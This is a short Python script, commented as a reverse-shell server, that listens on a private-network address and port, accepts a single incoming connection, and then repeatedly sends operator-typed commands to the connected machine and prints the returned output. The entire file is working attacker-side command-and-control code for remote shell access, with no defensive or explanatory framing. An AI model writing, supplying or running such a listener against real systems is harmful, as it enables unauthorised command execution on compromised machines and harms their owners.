#server socket for reverse shell
import socket

SERVER_IP = '192.168.1.105'
PORT = 5678

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((SERVER_IP, PORT))
    print('Server listening..')
    s.listen(1)

    conn, addr = s.accept()
    print(f'Connection established from {addr}')
    msg = conn.recv(1024)
    print(msg.decode())

    while True:
        cmd = input('shell: ')
        if cmd == ('exit'):
            conn.send(cmd.encode())
            break
        else:
            conn.send(cmd.encode())

        output = conn.recv(1024)
        print(output.decode())
conn.close()
